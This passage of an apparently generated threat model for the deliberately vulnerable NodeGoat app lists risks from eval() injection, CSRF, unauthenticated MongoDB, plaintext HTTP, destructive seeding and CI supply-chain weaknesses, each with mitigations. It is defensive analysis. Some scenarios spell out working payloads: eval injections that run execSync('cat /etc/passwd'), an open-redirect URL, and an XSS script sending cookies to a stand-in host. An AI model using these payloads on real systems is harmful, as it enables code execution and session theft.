Session cookies are sent on cross-site form posts (no SameSite restriction configured).
The deployed app runs without any CSRF token middleware in front of the /contributions POST handler.
threats.impactReason: An attacker can change a victim's payroll deduction percentages, and the forged request also reaches a code-execution sink.
threats.likelihoodReason: Requires a logged-in victim to load attacker content, but the request itself is a trivial cross-origin form post. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable CSRF tokens on state-changing contribution posts.
steps: Uncomment and enable the csurf middleware in server.js and expose res.locals.csrftoken to templates.
Add the hidden {{csrftoken}} input to the form in app/views/contributions.html at the <form method="POST" action="/contributions"> element.
Set the session cookie to SameSite=Lax/Strict in the express-session options.

threats.title: Server-side JavaScript injection via preTax/afterTax/roth on POST /contributions
threats.asset: the NodeGoat application process and everything it can reach, including the MongoDB contributions and users collections
threats.attackScenario: handleContributionsUpdate in app/routes/contributions.js passes req.body.preTax, req.body.afterTax and req.body.roth straight into eval() at lines 32-34, so an authenticated attacker POSTs to /contributions with preTax=require('child_process').execSync('cat /etc/passwd').toString() (or a reverse shell payload) and the string is executed as Node code inside the Express process, giving remote code execution and access to the Mongo connection held by the app.
threats.impactReason: Arbitrary code execution in the application process exposes every collection (users with plaintext passwords, profile SSN and bank details) and the host.
threats.likelihoodReason: The sink is reached directly from a POST body field on a routed endpoint with no sanitisation; exploitation is a single crafted form post.

mitigation.summary: Replace eval() with numeric parsing of the contribution fields.
steps: At app/routes/contributions.js:32-34 use the already-commented parseInt(req.body.preTax, 10) form (lines 38-40) for all three fields.
Reject values that are not integers between 0 and 30 before calling contributionsDAO.update.
Add a server-side whitelist validation helper so no request body string ever reaches a dynamic code construct.

threats.title: Contribution updates are written to MongoDB with no per-action audit record
threats.asset: audit trail for changes to retirement contribution percentages
threats.attackScenario: ContributionsDAO.update in app/data/contributions-dao.js upserts the contributions document for a userId and only console.logs "Updated contributions", keeping no actor, timestamp or previous value, so a user who changes their percentages (or an attacker who forged the POST /contributions request) can later deny the change and no record exists to contradict them.
assumptions: No external audit logging middleware records request bodies or identities for /contributions in the deployed environment.
threats.impactReason: Financial deduction changes cannot be attributed or reconstructed, but the data itself remains available.
threats.likelihoodReason: Every contribution update takes this path; the absence of a record is the default behaviour.

mitigation.summary: Write an append-only audit entry for every contribution change.
steps: In app/data/contributions-dao.js update(), insert a document into a contributions_audit collection holding userId, old and new preTax/afterTax/roth, timestamp and session id.
Replace the console.log at app/data/contributions-dao.js:36 with a structured logger call including the userId and request id.

threats.title: MongoDB wire traffic carrying contributions and user records is unauthenticated and unencrypted
threats.asset: retirement contribution percentages and the users collection (plaintext passwords, SSN and bank details) reachable over the same connection
threats.attackScenario: The connection string in config/env/all.js:3 and docker-compose.yml:8 is mongodb://mongo:27017/nodegoat with no credentials and no TLS option, so anyone who can reach the mongo service on the compose network connects with a plain mongo shell (or passively reads the wire protocol frames of the contributions upsert) and reads or rewrites the contributions and users collections without presenting any identity.
assumptions: An attacker can obtain a foothold on the container network or a shared host interface.
MongoDB has no authentication enabled and is reachable without credentials, matching the docker-compose configuration.
The MongoDB instance is started without authentication enabled and without TLS, as the credential-free URI in config/env/all.js and docker-compose.yml implies.
threats.impactReason: The same connection exposes users documents that store passwords as received (app/data/user-dao.js:25) plus profile SSN and bank routing fields.
threats.likelihoodReason: Requires network adjacency to the mongo service rather than direct internet access, but no credential is needed once there. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and TLS on the MongoDB connection.
steps: Create a least-privilege application user in MongoDB and put the credentials in MONGODB_URI via environment, not in config/env/all.js.
Start mongo with --auth and --tlsMode requireTLS in docker-compose.yml and append ?tls=true&authSource=admin to the URI.
Remove the credential-free default fallback mongodb://localhost:27017/nodegoat from config/env/all.js:3 so a misconfigured deployment fails closed.

threats.title: Unbounded contribution upserts from POST /contributions can saturate the MongoDB connection
threats.asset: availability of the contributions collection and the shared MongoDB connection
threats.attackScenario: Each POST /contributions triggers a contributionsDB.update upsert plus a userDAO.getUserById lookup in app/data/contributions-dao.js with no throttling, so an attacker holding one session loops thousands of contribution posts per second and exhausts the single shared MongoClient connection pool, stalling every other page that reads users, allocations or memos.
assumptions: No rate limiting or request throttling is applied in front of the /contributions route in the deployed environment.
The application shares one MongoClient connection pool across all DAOs.
threats.impactReason: Database saturation degrades the whole application rather than a single feature, but no data is lost.
threats.likelihoodReason: Any registered user can drive the loop; only a session cookie is needed.

mitigation.summary: Throttle contribution writes per session and bound the database work they cause.
steps: Add per-session rate limiting to the POST /contributions route registration in app/routes/index.js.
Set maxPoolSize and a serverSelectionTimeoutMS on the MongoClient.connect call in server.js so a flood fails fast instead of queueing.
Skip the userDAO.getUserById round trip in app/data/contributions-dao.js when the update is a no-op.

threats.title: Contribution values and session cookie travel over plaintext HTTP on the /contributions post
threats.asset: session cookie and submitted retirement contribution percentages
threats.attackScenario: An attacker on the same network as the user captures the POST /contributions request, which is sent over the cleartext HTTP listener created in server.js:145, reads the session cookie from the request headers and replays it to impersonate the employee or rewrites the preTax/afterTax/roth body values in transit.
assumptions: The application is reached directly over the http listener in server.js rather than behind a TLS-terminating proxy.
The session cookie is issued without the secure flag, as the secure cookie option in server.js is commented out.
threats.impactReason: A stolen session cookie gives full access to the victim's account, including the eval-backed contributions endpoint.
threats.likelihoodReason: Requires a network position (shared Wi-Fi, hostile proxy), but no authentication or user interaction beyond normal use.

mitigation.summary: Serve the application over HTTPS and mark the session cookie secure.
steps: Enable the https.createServer block already present in server.js instead of http.createServer.
Set cookie: { secure: true, httpOnly: true, sameSite: 'lax' } in the express-session options in server.js.
Add HSTS (helmet.hsts(), already imported but commented out) so browsers refuse plaintext.

threats.title: Cross-site request forgery forces contribution percentage changes over unauthenticated-looking POST /contributions
threats.asset: the victim's retirement contribution percentages (and, combined with eval, code execution in the victim's session context)
threats.attackScenario: An attacker hosts a page that auto-submits a hidden form to http://<app>/contributions with preTax/afterTax/roth fields; a logged-in victim visiting it has their session cookie attached by the browser and app/routes/contributions.js writes the attacker's values via contributionsDAO.update, because the request carries no anti-CSRF token that the server verifies.
assumptions: CSRF protection is disabled on these state-changing routes, so cross-site request forgery is possible.
No CSRF token middleware is active in front of the /contributions POST handler, so the request is authorised by the session cookie alone.
The session cookie is sent on cross-site form posts (no SameSite restriction configured).
threats.impactReason: An attacker can silently alter a victim's payroll deduction percentages, and the same forged post reaches the eval() sink.
threats.likelihoodReason: Only needs a logged-in victim to load an attacker-controlled page; no credentials or network position required. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable CSRF token verification on the contributions form post.
steps: Re-enable the csurf middleware and the res.locals.csrftoken helper in server.js.
Render the token as a hidden input in the POST form in app/views/contributions.html.
Set the session cookie to SameSite=Lax in the express-session options.

threats.title: Server-side JavaScript injection via eval() on POST /contributions body fields
threats.asset: the Node.js application process and the MongoDB data it can reach (retirement contribution percentages, user records)
threats.attackScenario: An attacker who is logged in submits POST /contributions with preTax=this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd') (or a while(1) loop), which app/routes/contributions.js:32-34 passes straight into eval(), executing attacker-supplied JavaScript inside the Express process and giving arbitrary command execution or a hung event loop.
threats.impactReason: eval of request body text is remote code execution in the server process, exposing the Mongo connection, the cookie secret and every user record, and a non-terminating expression blocks the single-threaded event loop for all users.
threats.likelihoodReason: Any registered user can post the form fields; the payload travels in an ordinary form POST and needs no special position.

mitigation.summary: Replace eval() with numeric parsing and range validation for the three contribution fields.
steps: In app/routes/contributions.js:32-34 use parseInt(req.body.preTax, 10) (the commented-out fix at lines 38-40) for preTax, afterTax and roth.
Reject the request when Number.isNaN or the value is outside 0..30 before calling contributionsDAO.update.
Add a lint/CI rule banning eval() and new Function() in app/.

threats.title: MongoDB connection string in docker-compose.yml uses no authentication or TLS
threats.asset: the nodegoat MongoDB database contents (user accounts, allocations, memos)
threats.attackScenario: The MONGODB_URI configured for the application at docker-compose.yml:8 is mongodb://mongo:27017/nodegoat with no credentials and no tls option, so an attacker who obtains any foothold on the compose bridge network (for example via the web container exposed on port 4000) connects directly to mongo:27017 with mongosh and reads or drops the nodegoat users collection without authenticating.
assumptions: No network policy isolates the mongo service from other workloads on the same Docker network.
The mongo:4.4 container is started without --auth, matching the credential-less URI used by the application.
threats.impactReason: Unauthenticated database access allows full read and write of every collection, including password hashes stored by the application.
threats.likelihoodReason: Requires a position on the container network first, but once there no credential is needed at all.

mitigation.summary: Enable MongoDB authentication and TLS for the nodegoat database connection.
steps: Set MONGO_INITDB_ROOT_USERNAME/MONGO_INITDB_ROOT_PASSWORD on the mongo service in docker-compose.yml and create a least-privilege application user for the nodegoat database.
Change MONGODB_URI at docker-compose.yml:8 to include those credentials from a secret or .env file rather than a literal, and add tls=true once the mongo container serves a certificate.
Keep the mongo service on `expose` only (as it already is) so the port is never published to the host.

threats.title: Outdated mongodb 2.x driver pinned as a dependency
threats.asset: the nodegoat MongoDB database contents
threats.attackScenario: package.json:18 pins "mongodb": "^2.1.18", a long end-of-life driver branch whose BSON and query-serialisation code predates fixes shipped in later majors, so an attacker feeding attacker-controlled object structures (for example JSON bodies reaching find/update calls) exercises known driver-level parsing and query-shaping defects instead of a hardened current driver.
assumptions: The declared ^2.1.18 range is what is actually installed at runtime rather than an overridden newer driver.
threats.impactReason: Driver-level defects affect every query the application issues against the nodegoat database.
threats.likelihoodReason: The version is fixed in package.json and no upgrade path is present, so the weakness is permanently reachable through normal request handling.

mitigation.summary: Upgrade the mongodb driver to a currently supported major version.
steps: Raise "mongodb" in package.json:18 to a maintained 4.x/5.x release and adapt the connect/collection calls to the promise-based API.
Add npm audit to the existing grunt precommit script so new advisories against the driver fail the build.

threats.title: Seed write to MongoDB carries fixed credentials over an unauthenticated, unencrypted wire connection
threats.asset: seeded admin credentials and the users collection
threats.attackScenario: The seed-write flow uses the connection string `mongodb://mongo:27017/nodegoat` from docker-compose.yml:8 (falling back to `mongodb://localhost:27017/nodegoat` in config/env/all.js:3) with no username, password or tls option, so an attacker on the compose bridge network connects directly to mongo:27017, reads the seeded admin password document inserted by artifacts/db-reset.js, or impersonates the seed client and writes their own isAdmin:true user into the users collection.
assumptions: An attacker can reach the mongo service port from another container or host on the same network.
MongoDB has no authentication enabled and is reachable without credentials, matching the docker-compose configuration.
The MongoDB deployment accepts connections without authentication, since neither the compose URI nor config/env/all.js supplies credentials or a tls parameter.
threats.impactReason: Direct database access exposes plaintext passwords, SSN and bank details and allows insertion of an attacker-controlled admin account.
threats.likelihoodReason: Requires a foothold on the container network or a misexposed Mongo port, but no credentials at all once there. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and TLS on the MongoDB connection used by the seed script and the DAOs.
steps: Enable MongoDB authentication on the mongo service in docker-compose.yml and create a least-privilege user for the application.
Change MONGODB_URI in docker-compose.yml:8 and the default in config/env/all.js:3 to include credentials and `tls=true`, sourcing the password from an environment secret rather than a literal.
Bind the mongo container to an internal network only and keep port 27017 unpublished.

threats.title: Seed script drops all collections and reinstalls fixed admin credentials on every container start
threats.asset: seeded admin credentials and all stored application collections
threats.attackScenario: artifacts/db-reset.js calls tryDropCollection and re-inserts the fixed accounts admin/user1/user2 (lines 12-48) and is wired into the container start command in docker-compose.yml:9 and the Heroku postdeploy hook in app.json:13, so an attacker who learns the deployment uses NodeGoat's seed logs in as userName "admin" with the well-known seeded password to reach every user record, and any restart or redeploy wipes users, allocations, contributions and memos collections with no confirmation.
assumptions: The seeded admin account is not deleted or repasworded after deployment in the running environment.
The seeded password values are the well-known NodeGoat defaults hinted at in the commented lines of artifacts/db-reset.js.
threats.impactReason: A known admin credential gives full administrative access to SSN, bank details and benefit records, and the drop path destroys all stored collections.
threats.likelihoodReason: Both the compose command and the Heroku postdeploy script run the reset unattended, and the seeded usernames are public in the repository.

mitigation.summary: Stop seeding fixed credentials and stop running the destructive reset automatically in non-development deployments.
steps: Guard the drop/insert logic in artifacts/db-reset.js so it aborts unless NODE_ENV is explicitly 'development'.
Generate the seed passwords from an environment variable or random value at run time instead of the literals at artifacts/db-reset.js:18, 27 and 35.
Remove `node artifacts/db-reset.js` from the container command in docker-compose.yml:9 and from the postdeploy hook in app.json:13, invoking it manually only when initialising a local database.

threats.title: Seed reset leaves no audit record of who wiped and repopulated the database
threats.asset: integrity record of the users, allocations, contributions and memos collections
threats.attackScenario: artifacts/db-reset.js only writes console.log lines such as `Dropped collection: ${name}` to stdout and records no operator identity, timestamp store or pre-drop snapshot, so anyone with shell access to the web container can run `node artifacts/db-reset.js` to erase evidence of tampering in the users and memos collections and later deny having done so.
assumptions: Container stdout is not shipped to a tamper-resistant log store in the deployment.
No separate audit trail records invocations of the reset script.
threats.impactReason: Loss of the ability to attribute destruction or re-seeding of user and memo records, hampering incident response.
threats.likelihoodReason: Running the script requires access to the application container or Heroku dyno rather than an unauthenticated network position.

mitigation.summary: Record an attributable, durable audit entry for every reset invocation.
steps: Write an audit document (operator identity from an environment variable, timestamp, collections dropped) into a separate append-only collection before dropping anything in artifacts/db-reset.js.
Ship container stdout to an external log sink configured in docker-compose.yml so console output cannot be discarded with the container.

threats.title: Compose web service publishes port 4000 on all host interfaces with no fronting proxy
threats.asset: application session cookies and credentials submitted to the nodegoat web service
threats.attackScenario: docker-compose.yml:10-11 maps "4000:4000" without a bind address and without any TLS terminator in the compose file, so anyone who can route to the host reaches http://host:4000/login directly over cleartext HTTP and captures or replays the submitted username, password and express-session cookie from the wire.
assumptions: No external reverse proxy terminating TLS is placed in front of the published port in the deployment being assessed.
The compose stack is run on a host whose port 4000 is reachable beyond localhost.
threats.impactReason: Cleartext credentials and session cookies allow full account takeover of any user who logs in over the exposed port.
threats.likelihoodReason: A published container port needs no authentication to reach; interception requires a network position on the path.

mitigation.summary: Bind the published port to loopback and front the web service with a TLS-terminating proxy.
steps: Change the mapping at docker-compose.yml:11 to "127.0.0.1:4000:4000" so the container is not directly exposed on external interfaces.
Add a reverse-proxy service (nginx or Caddy) to docker-compose.yml that terminates TLS and forwards to web:4000.
Set secure and httpOnly on the express-session cookie once traffic is HTTPS-only.

threats.title: Compose web container runs the database reset script on every start
threats.asset: persisted nodegoat application data in the mongo service
threats.attackScenario: The web service command at docker-compose.yml:9 runs `node artifacts/db-reset.js` before `npm start`, so anyone able to restart or crash the container (for example by exhausting the process through the port-4000 listener) causes the nodegoat database to be wiped and reseeded, destroying all stored user records on the next boot.
assumptions: The same compose file is used outside a throwaway demo context, so the reset destroys data that matters.
artifacts/db-reset.js drops and reseeds the nodegoat collections rather than seeding only when empty.
threats.impactReason: A restart silently erases every record in the nodegoat database, with no backup step present in the compose definition.
threats.likelihoodReason: Requires causing a container restart rather than a direct request, and the compose file may only be used for local demos.

mitigation.summary: Remove the unconditional database reset from the container start command.
steps: Split the seeding step out of the web command at docker-compose.yml:9 into a separate one-shot service or a manual `npm run db:seed` invocation.
Guard artifacts/db-reset.js so it refuses to run unless NODE_ENV is test or development.

threats.title: Container filesystem stays writable by the application user because the hardening step is commented out
threats.asset: the deployed application code under /home/node/app
threats.attackScenario: Dockerfile:15 leaves the `chmod -R o-wrx $WORKDIR` hardening line commented out while Dockerfile:13 gives the node user ownership of the whole app directory, so an attacker who achieves any code execution as the node user on the service at port 4000 can overwrite the application's own JavaScript files and persist a backdoor across process restarts inside that container.
assumptions: The container is run without a read-only root filesystem flag at deploy time.
threats.impactReason: Tampered application files let injected code run with the service's privileges until the container is replaced.
threats.likelihoodReason: Requires an existing code-execution foothold in the container first; it is a persistence amplifier rather than an entry point.

mitigation.summary: Make the application directory non-writable by the runtime user and run the container read-only.
steps: Uncomment and adjust the chmod/chown hardening line at Dockerfile:15 so the node user owns nothing writable under the app directory.
Run the container with `--read-only` plus an explicit tmpfs for any scratch paths.

threats.title: Container image built on end-of-life node:12-alpine base carries unpatched runtime CVEs
threats.asset: the application container runtime and the source tree copied into /home/node/app
threats.attackScenario: The image at Dockerfile:1 and Dockerfile:7 pins FROM node:12-alpine, a Node.js release line that no longer receives security fixes, so an attacker who reaches the service exposed on port 4000 can target a known unpatched Node 12 or Alpine OpenSSL CVE to crash or execute code inside the container.
assumptions: The published image is rebuilt rarely, so the node:12-alpine tag it resolves to lags current security patches.
threats.impactReason: A runtime-level flaw in the base image gives code execution or denial of service inside the container that serves port 4000.
threats.likelihoodReason: Node 12 is out of support and its CVEs are public, but exploitation still requires reaching the exposed port with a matching payload.

mitigation.summary: Move the build and runtime stages onto a supported, digest-pinned Node base image.
steps: Change both FROM lines in Dockerfile (lines 1 and 7) to a currently supported LTS tag such as node:22-alpine and pin it by sha256 digest.
Re-run the e2e workflow matrix in .github/workflows/e2e-test.yml against the new Node version before switching.
Add a scheduled image rebuild so base-image patches are picked up.

threats.title: Whole build context including secrets and .git is copied into the runtime image
threats.asset: local environment files, credentials and git history present in the build context
threats.attackScenario: Dockerfile:13 runs `COPY --chown=node . $WORKDIR`, copying the entire build context into the runtime image, so an attacker who pulls the published image (or gets any file read primitive in the service on port 4000) can read a committed .env, .npmrc or .git directory that was present on the build machine.
assumptions: The repository has no .dockerignore excluding .env, .git and local credential files from the build context.
threats.impactReason: Any credential or token sitting in the build context becomes permanently readable in a distributable image layer.
threats.likelihoodReason: The blanket COPY happens on every build; whether secrets are present depends on the developer's working tree.

mitigation.summary: Restrict what enters the image and the build context.
steps: Add a .dockerignore listing .git, .env*, node_modules, .npmrc and test fixtures.
Replace the blanket `COPY --chown=node . $WORKDIR` at Dockerfile:13 with explicit COPY lines for src, package.json and package-lock.json only.

threats.title: Unpinned third-party actions in the e2e-test workflow allow supply-chain tampering of CI runs
threats.asset: the CI build runner and the artefacts it produces for the repository
threats.attackScenario: The e2e-test job at .github/workflows/e2e-test.yml:16, 21 and 26 references actions/checkout@v2, actions/setup-node@v1 and actions/cache@v2 by mutable tag, so an attacker who compromises one of those action repositories or the tag it points at gets arbitrary code executed on the ubuntu-latest runner on every push and pull_request build.
assumptions: The workflow is not covered by an organisation policy that forces commit-SHA pinning of actions.
threats.impactReason: Runner code execution exposes the workflow's GITHUB_TOKEN and lets the attacker tamper with test results, though persist-credentials is disabled for checkout.
threats.likelihoodReason: Requires compromise of a widely watched first-party action or its tag, which is uncommon but has precedent.

mitigation.summary: Pin every third-party action to an immutable commit SHA and keep it updated.
steps: Replace the @v2/@v1 tags at .github/workflows/e2e-test.yml lines 16, 21 and 26 with full commit SHAs.
Add an explicit least-privilege `permissions:` block to the e2e-test job.
Enable Dependabot for github-actions so pinned SHAs receive update PRs.

threats.title: Cache poisoning of the shared npm cache key in the e2e-test workflow
threats.asset: npm dependency contents restored into CI builds of the default branch
threats.attackScenario: The workflow runs on `pull_request` (.github/workflows/e2e-test.yml:2) and uses actions/cache with the key `${{ runner.os }}-node${{ matrix.node-version }}-E2E-${{ hashFiles('package-lock.json') }}` at line 31, so an attacker opens a pull request whose job writes tampered tarballs into ~/.npm under that shared key and later `npm ci` runs restore the poisoned packages.
assumptions: Cache entries written by pull-request jobs are visible to jobs on the base branch under the same key scope.
threats.impactReason: Poisoned dependency content would execute in subsequent CI builds with the runner's token and could be baked into tested artefacts.
threats.likelihoodReason: Requires an attacker to land a pull-request build and to match the lockfile-derived key, and GitHub's cache scoping limits cross-branch restores.

mitigation.summary: Avoid restoring a mutable shared cache in untrusted pull-request builds.
steps: Split the workflow so the pull_request trigger runs with cache restore only (no save), or drop actions/cache from the pull_request path in .github/workflows/e2e-test.yml.
Include the event name or a trust marker in the cache key at line 31 so fork PR caches are isolated.
Rely on `npm ci` with the committed package-lock.json integrity hashes as the authoritative source.

threats.title: Login credentials submitted over plaintext HTTP by the End User's browser
threats.asset: login credentials
threats.attackScenario: The End User loads /login (app/routes/index.js:33) and submits the form to POST /login (app/routes/index.js:34) while server.js:145 listens with http.createServer only, so an attacker sharing the network reads the plaintext userName and password from the POST body and then signs in as that user.
assumptions: No TLS-terminating reverse proxy fronts the Express server in the deployed environment.
threats.impactReason: Captured credentials give full persistent account takeover, including the SSN and bank account fields editable at /profile.
threats.likelihoodReason: Any attacker on a shared network path can passively read the POST body; no client-side protection exists.

mitigation.summary: Only accept credentials over HTTPS.
steps: Enable the https.createServer block commented at server.js:149-155 or place the app behind a TLS-terminating proxy.
Redirect all plain HTTP requests to HTTPS and enable helmet.hsts() as sketched at server.js:54.

threats.title: User actions cannot be attributed because the session cookie is forgeable and no request logging identifies the actor
threats.asset: audit trail of user authentication and profile changes
threats.attackScenario: An End User signs in at POST /login (app/routes/index.js:34) and then changes their SSN or bank account at POST /profile; because the session is held in the default MemoryStore with a cookieSecret drawn from config and no authentication or profile-change events are written to an audit log, the user can later deny having made the change and no server-side record contradicts them.
assumptions: No audit log of login and profile-modification events is written anywhere in the deployment.
threats.impactReason: Disputed changes to bank account and SSN fields cannot be traced back to a specific authenticated session.
threats.likelihoodReason: Any end user can repudiate an action; nothing in the request path records who performed it.

mitigation.summary: Log authenticated actions with a stable session and user identifier.
steps: Add middleware after the session setup in server.js:78-102 that logs user id, action, source IP and timestamp for POST /login and POST /profile.
Replace the default MemoryStore with a persistent session store so session identifiers survive restarts and can be correlated with log entries.

threats.title: Error responses and rendered pages travel over plaintext HTTP, exposing the session cookie
threats.asset: session cookie and rendered user data (SSN, bank account) returned to the browser
threats.attackScenario: server.js:145 serves the app with http.createServer (the https variant is commented out at lines 149-155) and the session cookie block that would set httpOnly/secure is commented out at server.js:92-100, so an attacker on the same network path captures the connect.sid cookie from any rendered response, including the 500 error page, and replays it to impersonate the victim.
assumptions: No TLS-terminating reverse proxy sits in front of the Express server in the deployed environment.
threats.impactReason: A stolen session cookie yields full access to the victim's profile, which holds SSN and bank account fields (app/views/profile.html:48-58).
threats.likelihoodReason: Requires network position (shared Wi-Fi, upstream hop), but no application-level obstacle exists since every response is cleartext.

mitigation.summary: Terminate TLS and mark the session cookie secure and httpOnly.
steps: Re-enable the https.createServer block in server.js (lines 149-155) or place the container behind a TLS-terminating proxy and set app.set("trust proxy", 1).
Uncomment and complete the session cookie options in server.js:92-100 with { httpOnly: true, secure: true, maxAge: <ttl> }.
Re-enable helmet.hsts() (server.js:54) so browsers refuse plaintext on later visits.

threats.title: Open redirect on GET /learn sends users to attacker-chosen hosts
threats.asset: user session state and login credentials phished after redirect
threats.attackScenario: GET /learn at app/routes/index.js:70-73 passes req.query.url straight into res.redirect with no allow-list or validation, so an attacker mails a logged-in employee a link to /learn?url=https://evil.example/login that the server answers with a 302 to a cloned RetireEasy login page, harvesting credentials.
assumptions: No upstream middleware rewrites or validates the url query parameter before the handler runs.
threats.impactReason: Redirects from a trusted origin make credential phishing markedly more effective, but no data is read directly.
threats.likelihoodReason: The route needs only a logged-in session and the parameter is entirely attacker-controlled through a URL.

mitigation.summary: Validate the redirect target against an allow-list of internal paths.
steps: In app/routes/index.js:70-73, reject any url value that is not a relative path beginning with a single "/" (no "//" or scheme).
Alternatively map a short key (e.g. ?doc=owasp-top10) to a server-side table of permitted URLs.
Return 400 for unrecognised values instead of redirecting.

threats.title: Swig autoescape disabled lets stored profile input execute in rendered responses
threats.asset: session cookie and rendered user data of viewers of the page
threats.attackScenario: swig.setDefaults({ autoescape: false }) at server.js:135-142 means template variables such as {{lastName}} and {{ssn}} in app/views/profile.html:45-49 are emitted raw, so an attacker posts <script>fetch('//evil/'+document.cookie)</script> as their last name and the payload runs in every browser that receives the rendered page over this flow.
